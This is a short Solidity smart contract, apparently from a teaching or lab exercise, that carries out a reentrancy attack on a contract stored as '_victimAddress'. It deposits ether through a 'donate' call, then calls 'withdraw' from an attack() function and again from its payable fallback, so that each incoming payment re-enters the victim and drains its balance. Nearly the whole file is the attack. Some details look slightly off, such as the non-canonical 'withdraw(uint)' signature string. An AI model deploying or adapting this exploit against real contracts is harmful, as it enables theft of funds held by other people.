// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.7.0 <0.9.0;

contract Testing {
    address _victimAddress;

    constructor(address addr) public {
        _victimAddress = addr;
    }

    function sendMoney() public payable {
        bytes memory functSig = abi.encodeWithSignature(
            "donate(address)",
            address(this)
        );
        (bool success, bytes memory returnData) = address(_victimAddress).call{
            value: msg.value
        }(functSig);
        require(success);
    }

    function attack() public payable {
        bytes memory functSig = abi.encodeWithSignature("withdraw(uint)", 5000);
        (bool success, bytes memory returnData) = address(_victimAddress).call(
            functSig
        );
    }

    function checkBalance() public view returns (uint) {
        return address(this).balance;
    }

    fallback() external payable {
        bytes memory functSig = abi.encodeWithSignature("withdraw(uint)", 5000);
        (bool success, bytes memory returnData) = address(_victimAddress).call(
            functSig
        );
    }
}
